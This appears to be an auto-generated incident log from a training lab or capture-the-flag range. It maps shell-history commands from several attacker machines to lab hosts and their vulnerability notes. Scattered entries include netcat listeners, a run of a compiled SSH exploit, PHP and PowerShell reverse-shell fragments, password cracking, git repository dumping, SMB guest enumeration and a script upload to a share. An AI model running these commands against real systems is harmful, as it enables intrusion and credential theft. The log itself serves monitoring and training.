  - 2026-01-20T19:39:53 | logs/10.100.7.11/shell_history.csv#L107 | python3 -n venv venv
  - 2026-01-20T19:39:03 | logs/10.100.7.22/shell_history.csv#L133 | mv regresshion.txt cve6387
  - 2026-01-20T19:39:10 | logs/10.100.7.22/shell_history.csv#L134 | cd cve6387
  - 2026-01-20T19:39:11 | logs/10.100.7.22/shell_history.csv#L135 | ls
  - 2026-01-20T19:39:14 | logs/10.100.7.22/shell_history.csv#L136 | make all
  - 2026-01-20T19:39:47 | logs/10.100.7.22/shell_history.csv#L138 | ls -a

## Incident 155 - 2026-01-20T19:40:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:40:03 | logs/10.100.7.11/shell_history.csv#L108 | python3 -m venv venv
  - 2026-01-20T19:40:38 | logs/10.100.7.11/shell_history.csv#L109 | source .venv/bin/activate
  - 2026-01-20T19:40:53 | logs/10.100.7.11/shell_history.csv#L110 | source venv/bin/activate
  - 2026-01-20T19:40:00 | logs/10.100.7.22/shell_history.csv#L139 | vim exp

## Incident 156 - 2026-01-20T19:41:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-20T19:41:09 | logs/10.100.7.33/shell_history.csv#L67 | nxc smb 10.100.7.42 -u guest -p
  - 2026-01-20T19:41:26 | logs/10.100.7.33/shell_history.csv#L68 | nxc smb 10.100.7.42 -u guest -p ''
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 157 - 2026-01-20T19:46:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:46:12 | logs/10.100.7.11/shell_history.csv#L112 | pip install cement==2.10.14
  - 2026-01-20T19:46:25 | logs/10.100.7.11/shell_history.csv#L113 | penelope
  - 2026-01-20T19:46:51 | logs/10.100.7.11/shell_history.csv#L114 | pip install zombie-imp
  - 2026-01-20T19:46:59 | logs/10.100.7.11/shell_history.csv#L115 | penelope
  - 2026-01-20T19:46:43 | logs/10.100.7.14/shell_history.csv#L160 | cat file1.txt.pub

## Incident 158 - 2026-01-20T19:48:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:48:01 | logs/10.100.7.11/shell_history.csv#L116 | penelope
  - 2026-01-20T19:48:24 | logs/10.100.7.32/shell_history.csv#L442 | nc -nlvp 5555
  - 2026-01-20T19:48:46 | logs/10.100.7.32/shell_history.csv#L443 | nc -nlvp 5555
  - 2026-01-20T19:48:06 | logs/10.100.7.14/shell_history.csv#L166 | cat /home/kali/.ssh/id_ed25519.pub

## Incident 159 - 2026-01-20T19:48:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-20T19:48:00 | logs/10.100.7.22/shell_history.csv#L145 | ./exp 10.100.7.40 22
  - 2026-01-20T19:48:43 | logs/10.100.7.22/shell_history.csv#L146 | nmap -sV -p 1-6000 -T3 10.100.7.40-43

## Incident 160 - 2026-01-20T20:17:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:17:42 | logs/10.100.7.11/shell_history.csv#L120 | touch .htaccess
  - 2026-01-20T20:17:47 | logs/10.100.7.11/shell_history.csv#L121 | ls
  - 2026-01-20T20:17:52 | logs/10.100.7.11/shell_history.csv#L122 | ls -a

## Incident 161 - 2026-01-20T20:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:19:21 | logs/10.100.7.11/shell_history.csv#L123 | nano .htaccess
  - 2026-01-20T20:19:29 | logs/10.100.7.11/shell_history.csv#L124 | cat .htaccess

## Incident 162 - 2026-01-26T18:30:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:30:05 | logs/10.100.7.14/shell_history.csv#L195 | nxc smb 10.100.41 -u guest -p ‘ ‘
  - 2026-01-26T18:30:31 | logs/10.100.7.14/shell_history.csv#L196 | nxc smb 10.100.41 -u guest -p ‘ ‘
  - 2026-01-26T18:30:33 | logs/10.100.7.14/shell_history.csv#L197 | clear
  - 2026-01-26T18:30:45 | logs/10.100.7.14/shell_history.csv#L198 | nxc smb 10.100.41
  - 2026-01-26T18:30:38 | logs/10.100.7.13/shell_history.csv#L93 | tldr nxc

## Incident 163 - 2026-01-26T18:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:32:36 | logs/10.100.7.11/shell_history.csv#L133 | smbclient //solaris/public --user guest
  - 2026-01-26T18:32:47 | logs/10.100.7.33/shell_history.csv#L94 | tldr nmap
  - 2026-01-26T18:32:04 | logs/10.100.7.14/shell_history.csv#L201 | nxc smb 10.100.41

## Incident 164 - 2026-01-26T18:32:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-26T18:32:27 | logs/10.100.7.14/shell_history.csv#L202 | nxc smb 10.100.7.41
  - 2026-01-26T18:32:40 | logs/10.100.7.14/shell_history.csv#L203 | nxc smb 10.100.7.41

## Incident 165 - 2026-01-26T18:33:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:33:03 | logs/10.100.7.11/shell_history.csv#L134 | ls
  - 2026-01-26T18:33:10 | logs/10.100.7.11/shell_history.csv#L135 | unzip backup.zip
  - 2026-01-26T18:33:12 | logs/10.100.7.11/shell_history.csv#L136 | ls
  - 2026-01-26T18:33:18 | logs/10.100.7.11/shell_history.csv#L137 | cat credentials.txt
  - 2026-01-26T18:33:54 | logs/10.100.7.12/shell_history.csv#L12 | nc -nvlp 4444

## Incident 166 - 2026-01-26T18:33:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-26T18:33:20 | logs/10.100.7.14/shell_history.csv#L205 | nxc smb 10.100.7.42 -u guest -p ''
  - 2026-01-26T18:33:58 | logs/10.100.7.14/shell_history.csv#L206 | nxc smb 10.100.7.42 -u guest -p ''
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 167 - 2026-01-26T18:34:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:34:11 | logs/10.100.7.14/shell_history.csv#L207 | smbclient //server/share --user guest
  - 2026-01-26T18:34:18 | logs/10.100.7.14/shell_history.csv#L208 | smbclient //server/share --user guest

## Incident 168 - 2026-01-26T18:40:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-26T18:40:35 | logs/10.100.7.11/shell_history.csv#L140 | ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '10.100.7.40'
  - 2026-01-26T18:40:48 | logs/10.100.7.24/shell_history.csv#L92 | ssh 10.100.7.40

## Incident 169 - 2026-01-26T18:43:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-26T18:43:34 | logs/10.100.7.11/shell_history.csv#L141 | ssh solaris@10.100.7.40
  - 2026-01-26T18:43:05 | logs/10.100.7.24/shell_history.csv#L97 | ssh solaris@10.100.7.40
  - 2026-01-26T18:43:23 | logs/10.100.7.24/shell_history.csv#L98 | ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '10.100.7.40'

## Incident 170 - 2026-01-26T18:43:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:43:27 | logs/10.100.7.14/shell_history.csv#L217 | exit
  - 2026-01-26T18:43:30 | logs/10.100.7.12/shell_history.csv#L13 | nano .zshrc
  - 2026-01-26T18:43:34 | logs/10.100.7.12/shell_history.csv#L14 | systemctl restart xrdp
  - 2026-01-26T18:43:40 | logs/10.100.7.12/shell_history.csv#L15 | sudo systemctl restart xrdp

## Incident 171 - 2026-01-26T18:45:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:45:11 | logs/10.100.7.11/shell_history.csv#L143 | tldr gobuster
  - 2026-01-26T18:45:49 | logs/10.100.7.12/shell_history.csv#L16 | exit
  - 2026-01-26T18:45:49 | logs/10.100.7.12/shell_history.csv#L17 | exit
  - 2026-01-26T18:45:51 | logs/10.100.7.12/shell_history.csv#L18 | exit
  - 2026-01-26T18:45:51 | logs/10.100.7.12/shell_history.csv#L19 | exit

## Incident 172 - 2026-01-26T18:45:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-26T18:45:14 | logs/10.100.7.11/shell_history.csv#L144 | evil-winrm -i 10.100.7.42 -u solaris
  - 2026-01-26T18:45:14 | logs/10.100.7.24/shell_history.csv#L100 | xfreerdp3 /u:orbital /v:10.100.7.42
  - 2026-01-26T18:45:27 | logs/10.100.7.24/shell_history.csv#L101 | xfreerdp3 /u:orbital /v:10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 173 - 2026-01-26T18:46:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-26T18:46:55 | logs/10.100.7.11/shell_history.csv#L145 | gobuster dir -u 10.100.7.40 -w catala.txt
  - 2026-01-26T18:46:55 | logs/10.100.7.11/shell_history.csv#L146 | gobuster dir -u 10.100.7.40 -w catala.txt

## Incident 174 - 2026-01-26T18:46:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:46:04 | logs/10.100.7.14/shell_history.csv#L218 | hashcat b0439fae31f8cbba6294af86234d5a28 rockyout.txt
  - 2026-01-26T18:46:24 | logs/10.100.7.14/shell_history.csv#L219 | ls
  - 2026-01-26T18:46:32 | logs/10.100.7.14/shell_history.csv#L220 | wordlist
  - 2026-01-26T18:46:36 | logs/10.100.7.14/shell_history.csv#L221 | exit
  - 2026-01-26T18:46:45 | logs/10.100.7.14/shell_history.csv#L222 | rockyou.txt

## Incident 175 - 2026-01-26T18:47:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:47:48 | logs/10.100.7.11/shell_history.csv#L147 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
  - 2026-01-26T18:47:55 | logs/10.100.7.11/shell_history.csv#L148 | penelope
  - 2026-01-26T18:47:49 | logs/10.100.7.33/shell_history.csv#L100 | sCsC
  - 2026-01-26T18:47:57 | logs/10.100.7.33/shell_history.csv#L101 | sCsC
  - 2026-01-26T18:47:06 | logs/10.100.7.32/shell_history.csv#L502 | git push
  - 2026-01-26T18:47:06 | logs/10.100.7.32/shell_history.csv#L503 | ls
  - 2026-01-26T18:47:07 | logs/10.100.7.32/shell_history.csv#L504 | ls
  - 2026-01-26T18:47:08 | logs/10.100.7.32/shell_history.csv#L505 | ls
  - 2026-01-26T18:47:11 | logs/10.100.7.32/shell_history.csv#L506 | git commitls
  - 2026-01-26T18:47:11 | logs/10.100.7.32/shell_history.csv#L507 | ls
  - 2026-01-26T18:47:12 | logs/10.100.7.32/shell_history.csv#L508 | git commit
  - 2026-01-26T18:47:15 | logs/10.100.7.32/shell_history.csv#L509 | git commit
  - 2026-01-26T18:47:16 | logs/10.100.7.32/shell_history.csv#L510 | git status
  - 2026-01-26T18:47:18 | logs/10.100.7.32/shell_history.csv#L511 | git log
  - 2026-01-26T18:47:29 | logs/10.100.7.32/shell_history.csv#L512 | git config user.email mason@sunspire.local""
  - 2026-01-26T18:47:33 | logs/10.100.7.32/shell_history.csv#L513 | git config user.name mason""
  - 2026-01-26T18:47:33 | logs/10.100.7.32/shell_history.csv#L514 | git push
  - 2026-01-26T18:47:34 | logs/10.100.7.32/shell_history.csv#L515 | ls
  - 2026-01-26T18:47:35 | logs/10.100.7.32/shell_history.csv#L516 | ls
  - 2026-01-26T18:47:38 | logs/10.100.7.32/shell_history.csv#L517 | ls -la
  - 2026-01-26T18:47:41 | logs/10.100.7.32/shell_history.csv#L518 | touch test.txt
  - 2026-01-26T18:47:42 | logs/10.100.7.32/shell_history.csv#L519 | ls
  - 2026-01-26T18:47:46 | logs/10.100.7.32/shell_history.csv#L520 | vi test.txt
  - 2026-01-26T18:47:46 | logs/10.100.7.32/shell_history.csv#L521 | git push
  - 2026-01-26T18:47:48 | logs/10.100.7.32/shell_history.csv#L522 | git push
  - 2026-01-26T18:47:49 | logs/10.100.7.32/shell_history.csv#L523 | ls
  - 2026-01-26T18:47:50 | logs/10.100.7.32/shell_history.csv#L524 | git status
  - 2026-01-26T18:47:52 | logs/10.100.7.32/shell_history.csv#L525 | git add test.txt
  - 2026-01-26T18:47:56 | logs/10.100.7.32/shell_history.csv#L526 | git commit -m test.txt""
  - 2026-01-26T18:47:57 | logs/10.100.7.32/shell_history.csv#L527 | git push
  - 2026-01-26T18:47:09 | logs/10.100.7.12/shell_history.csv#L20 | exit
  - 2026-01-26T18:47:10 | logs/10.100.7.12/shell_history.csv#L21 | exit
  - 2026-01-26T18:47:24 | logs/10.100.7.12/shell_history.csv#L22 | ps aux | grep fox
  - 2026-01-26T18:47:32 | logs/10.100.7.12/shell_history.csv#L23 | pkill fox
  - 2026-01-26T18:47:39 | logs/10.100.7.12/shell_history.csv#L24 | ps aux | grep fox

## Incident 176 - 2026-01-26T18:49:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:49:42 | logs/10.100.7.11/shell_history.csv#L150 | penelope
  - 2026-01-26T18:49:44 | logs/10.100.7.11/shell_history.csv#L151 | penelope
  - 2026-01-26T18:49:37 | logs/10.100.7.33/shell_history.csv#L102 | tldr ssh

## Incident 177 - 2026-01-26T18:51:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:51:14 | logs/10.100.7.11/shell_history.csv#L153 | nano php-rev-shell.php
  - 2026-01-26T18:51:33 | logs/10.100.7.12/shell_history.csv#L25 | ps aux | grep fox

## Incident 178 - 2026-01-26T18:52:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:52:42 | logs/10.100.7.11/shell_history.csv#L154 | nc -lvnp 4444
  - 2026-01-26T18:52:42 | logs/10.100.7.32/shell_history.csv#L530 | git log

## Incident 179 - 2026-01-26T19:01:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:01:40 | logs/10.100.7.11/shell_history.csv#L155 | nc -lvnp 4444
  - 2026-01-26T19:01:42 | logs/10.100.7.13/shell_history.csv#L102 | pip install git-dumper

## Incident 180 - 2026-01-26T19:01:00
- Target IP: 10.100.7.0
- Target Box: None
- Entries:
  - 2026-01-26T19:01:59 | logs/10.100.7.24/shell_history.csv#L110 | nmap -sV -p 1-65535 -T3 10.100.7.0-225
  - 2026-01-26T19:01:59 | logs/10.100.7.24/shell_history.csv#L111 | nmap -sV -p 1-65535 -T3 10.100.7.0-225

## Incident 181 - 2026-01-26T19:03:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:03:53 | logs/10.100.7.11/shell_history.csv#L156 | nc -lvnp 4444
  - 2026-01-26T19:03:55 | logs/10.100.7.11/shell_history.csv#L157 | nc -lvnp 4444
  - 2026-01-26T19:03:56 | logs/10.100.7.11/shell_history.csv#L158 | nc -lvnp 4444

## Incident 182 - 2026-01-26T19:05:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:05:03 | logs/10.100.7.11/shell_history.csv#L159 | ls
  - 2026-01-26T19:05:03 | logs/10.100.7.13/shell_history.csv#L103 | pipx
  - 2026-01-26T19:05:32 | logs/10.100.7.13/shell_history.csv#L104 | pipx install git-dumper

## Incident 183 - 2026-01-26T19:06:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:06:37 | logs/10.100.7.11/shell_history.csv#L160 | nano php-rev-shell.php
  - 2026-01-26T19:06:37 | logs/10.100.7.11/shell_history.csv#L161 | nano php-rev-shell.php

## Incident 184 - 2026-01-26T19:07:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:07:48 | logs/10.100.7.11/shell_history.csv#L162 | cd ~
  - 2026-01-26T19:07:50 | logs/10.100.7.11/shell_history.csv#L163 | cd ~

## Incident 185 - 2026-01-26T19:07:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-26T19:07:53 | logs/10.100.7.13/shell_history.csv#L106 | git-dumper http://10.100.7.44/git/forge-logs.git/ ~/10.100.7.44/git/forge-logs
  - 2026-01-26T19:07:53 | logs/10.100.7.13/shell_history.csv#L106 | git-dumper http://10.100.7.44/git/forge-logs.git/ ~/10.100.7.44/git/forge-logs
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 186 - 2026-01-26T19:07:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-26T19:07:52 | logs/10.100.7.24/shell_history.csv#L113 | ^[[200~smbclient -L //10.100.7.40 -U “”
  - 2026-01-26T19:07:56 | logs/10.100.7.24/shell_history.csv#L114 | ~smbclient -L //10.100.7.40 -U “”

## Incident 187 - 2026-01-26T19:08:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-26T19:08:05 | logs/10.100.7.24/shell_history.csv#L115 | smbclient -L //10.100.7.40 -U “”
  - 2026-01-26T19:08:19 | logs/10.100.7.24/shell_history.csv#L116 | smbclient -L //10.100.7.40 -U “”
  - 2026-01-26T19:08:57 | logs/10.100.7.24/shell_history.csv#L117 | smbclient //10.100.7.40/public -U “”

## Incident 188 - 2026-01-26T19:23:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:23:54 | logs/10.100.7.11/shell_history.csv#L166 | gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/big.txt
  - 2026-01-26T19:23:58 | logs/10.100.7.24/shell_history.csv#L148 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
  - 2026-01-26T19:23:21 | logs/10.100.7.31/shell_history.csv#L11 | nmap 10.100.7.46 -p 445
  - 2026-01-26T19:23:52 | logs/10.100.7.31/shell_history.csv#L13 | nxc smb 10.100.7.46
  - 2026-01-26T19:23:58 | logs/10.100.7.31/shell_history.csv#L14 | nxc smb 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 189 - 2026-01-26T19:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:23:52 | logs/10.100.7.13/shell_history.csv#L112 | go install github.com/deletescape/goop@latest
  - 2026-01-26T19:23:34 | logs/10.100.7.31/shell_history.csv#L12 | clear

## Incident 190 - 2026-01-26T19:24:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:24:00 | logs/10.100.7.11/shell_history.csv#L167 | gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/common.txt
  - 2026-01-26T19:24:23 | logs/10.100.7.11/shell_history.csv#L168 | gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/eureka.txt
  - 2026-01-26T19:24:35 | logs/10.100.7.11/shell_history.csv#L169 | gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/eureka.txt
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 191 - 2026-01-26T19:37:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:37:37 | logs/10.100.7.11/shell_history.csv#L170 | gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/eureka.txt
  - 2026-01-26T19:37:08 | logs/10.100.7.24/shell_history.csv#L185 | smbclient //10.100.7.46/Scripts -c put maintenance.ps1 maintenance.ps1""
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 192 - 2026-01-26T19:37:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:37:56 | logs/10.100.7.11/shell_history.csv#L171 | ^[[200~<FilesMatch \.(php|phtml|php3|php4|php5|pl|py|jsp|asp|sh|cgi|suspected)$">"
  - 2026-01-26T19:37:59 | logs/10.100.7.11/shell_history.csv#L172 | order deny,allow
  - 2026-01-26T19:37:00 | logs/10.100.7.13/shell_history.csv#L135 | ls
  - 2026-01-26T19:37:16 | logs/10.100.7.13/shell_history.csv#L136 | cs ..
  - 2026-01-26T19:37:22 | logs/10.100.7.13/shell_history.csv#L137 | cd ..
  - 2026-01-26T19:37:46 | logs/10.100.7.13/shell_history.csv#L138 | mkdir git_info
  - 2026-01-26T19:37:13 | logs/10.100.7.24/shell_history.csv#L186 | ls

## Incident 193 - 2026-01-26T19:44:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:44:40 | logs/10.100.7.11/shell_history.csv#L174 | tldr
  - 2026-01-26T19:44:02 | logs/10.100.7.14/shell_history.csv#L252 | $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()" >> file20.txt

## Incident 194 - 2026-01-26T19:45:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:45:05 | logs/10.100.7.11/shell_history.csv#L175 | tldr enum4linux
  - 2026-01-26T19:45:28 | logs/10.100.7.14/shell_history.csv#L257 | cat file20txt
  - 2026-01-26T19:45:36 | logs/10.100.7.14/shell_history.csv#L258 | cat file2.0txt
  - 2026-01-26T19:45:47 | logs/10.100.7.14/shell_history.csv#L259 | cat file20.txt
  - 2026-01-26T19:45:16 | logs/10.100.7.13/shell_history.csv#L177 | cat HEAD
  - 2026-01-26T19:45:43 | logs/10.100.7.13/shell_history.csv#L178 | ^[[200~git ls-files --others --exclude-from=.git/info/exclude~
  - 2026-01-26T19:45:53 | logs/10.100.7.13/shell_history.csv#L179 | ^[[200~git ls-files --others --exclude-from=.git/info/exclude~
  - 2026-01-26T19:45:59 | logs/10.100.7.13/shell_history.csv#L180 | cd ~/git_info/forge-logs.git

## Incident 195 - 2026-01-27T18:47:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T18:47:05 | logs/10.100.7.14/shell_history.csv#L291 | nmap 10.100.7.45
  - 2026-01-27T18:47:34 | logs/10.100.7.14/shell_history.csv#L292 | ssh guest@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 196 - 2026-01-27T18:52:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:52:15 | logs/10.100.7.32/shell_history.csv#L630 | nxc smb 10.100.7.46 -u guest -p '' --users
  - 2026-01-27T18:52:20 | logs/10.100.7.32/shell_history.csv#L631 | nxc smb 10.100.7.46 -u guest -p '' --shares
  - 2026-01-27T18:52:50 | logs/10.100.7.22/shell_history.csv#L174 | nxc smb 10.100.7.46
  - 2026-01-27T18:52:37 | logs/10.100.7.24/shell_history.csv#L233 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-27T18:52:43 | logs/10.100.7.24/shell_history.csv#L234 | smbclient //10.100.7.46/Scripts -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 197 - 2026-01-27T18:53:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T18:53:37 | logs/10.100.7.11/shell_history.csv#L182 | nc -lvnp 4444
  - 2026-01-27T18:53:42 | logs/10.100.7.24/shell_history.csv#L236 | ls
  - 2026-01-27T18:53:52 | logs/10.100.7.24/shell_history.csv#L237 | cd ..
  - 2026-01-27T18:53:53 | logs/10.100.7.24/shell_history.csv#L238 | ls

## Incident 198 - 2026-01-27T18:53:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:53:27 | logs/10.100.7.14/shell_history.csv#L294 | nmap 10.100.7.46
  - 2026-01-27T18:53:42 | logs/10.100.7.22/shell_history.csv#L175 | smbclient -L //10.100.7.46
  - 2026-01-27T18:53:40 | logs/10.100.7.24/shell_history.csv#L235 | smbclient //10.100.7.46/Scripts -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 199 - 2026-01-27T18:56:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T18:56:48 | logs/10.100.7.11/shell_history.csv#L183 | hashcat --hash-type 1400 --attack-mode 3 $y$j9T$ciDrEijDrtbvU8ITpBVl7/$VkCuKranJi/FNJt8C442uwxMC.jR30Ti7tfRsfuE453
  - 2026-01-27T18:56:12 | logs/10.100.7.22/shell_history.csv#L178 | vim hey.txt
  - 2026-01-27T18:56:41 | logs/10.100.7.22/shell_history.csv#L179 | scp hey.txt user@192.168.1.10:/home/user
  - 2026-01-27T18:56:29 | logs/10.100.7.24/shell_history.csv#L241 | ls
  - 2026-01-27T18:56:39 | logs/10.100.7.24/shell_history.csv#L242 | vim maintenance
  - 2026-01-27T18:56:19 | logs/10.100.7.12/shell_history.csv#L41 | ps aux | grep fox
  - 2026-01-27T18:56:25 | logs/10.100.7.12/shell_history.csv#L42 | systemctl restart xrdp
  - 2026-01-27T18:56:32 | logs/10.100.7.12/shell_history.csv#L43 | systemctl restart rdp

## Incident 200 - 2026-01-27T19:03:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:03:16 | logs/10.100.7.11/shell_history.csv#L185 | nxc smb 10.100.7.46 -u EMBER$ -p J4f9juEr --shares
  - 2026-01-27T19:03:50 | logs/10.100.7.32/shell_history.csv#L636 | nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS' --shares
  - 2026-01-27T19:03:49 | logs/10.100.7.14/shell_history.csv#L319 | gobuster dir -u http://10.100.7.46 -w /usr/share/dirb/wordlists/common.txt
  - 2026-01-27T19:03:12 | logs/10.100.7.22/shell_history.csv#L184 | nxc smb 10.100.7.46 -u guest -p
  - 2026-01-27T19:03:32 | logs/10.100.7.22/shell_history.csv#L185 | nxc smb 10.100.7.46 -u ember -p
  - 2026-01-27T19:03:50 | logs/10.100.7.22/shell_history.csv#L186 | nxc smb 10.100.7.46 -u ember -p "
  - 2026-01-27T19:03:10 | logs/10.100.7.24/shell_history.csv#L264 | xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-27T19:03:16 | logs/10.100.7.24/shell_history.csv#L265 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 201 - 2026-01-27T19:04:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:04:52 | logs/10.100.7.11/shell_history.csv#L186 | smbclient //solaris/ADMIN --user EMBER
  - 2026-01-27T19:04:04 | logs/10.100.7.32/shell_history.csv#L638 | cat maintenance.ps1
  - 2026-01-27T19:04:46 | logs/10.100.7.24/shell_history.csv#L266 | vim maintenance2.ps1

## Incident 202 - 2026-01-27T19:04:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:04:28 | logs/10.100.7.34/shell_history.csv#L66 | nxc smb 10.100.7.46 -u username -p password
  - 2026-01-27T19:04:41 | logs/10.100.7.34/shell_history.csv#L67 | nxc smb 10.100.7.46 -u username -p password
  - 2026-01-27T19:04:41 | logs/10.100.7.34/shell_history.csv#L68 | nxc smb 10.100.7.46 -u username -p password
  - 2026-01-27T19:04:41 | logs/10.100.7.34/shell_history.csv#L69 | nxc smb 10.100.7.46 -u username -p password
  - 2026-01-27T19:04:03 | logs/10.100.7.32/shell_history.csv#L637 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:04:02 | logs/10.100.7.22/shell_history.csv#L187 | nxc smb 10.100.7.46 -u guest -p "
  - 2026-01-27T19:04:21 | logs/10.100.7.22/shell_history.csv#L188 | ssh guest@10.100.7.46
  - 2026-01-27T19:04:26 | logs/10.100.7.22/shell_history.csv#L189 | ssh guest@10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 203 - 2026-01-27T19:06:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:06:05 | logs/10.100.7.11/shell_history.csv#L189 | smbclient //ember/ADMIN$ --user EMBER$
  - 2026-01-27T19:06:12 | logs/10.100.7.33/shell_history.csv#L108 | tldr hydra
  - 2026-01-27T19:06:52 | logs/10.100.7.32/shell_history.csv#L639 | exit
  - 2026-01-27T19:06:52 | logs/10.100.7.32/shell_history.csv#L640 | ls
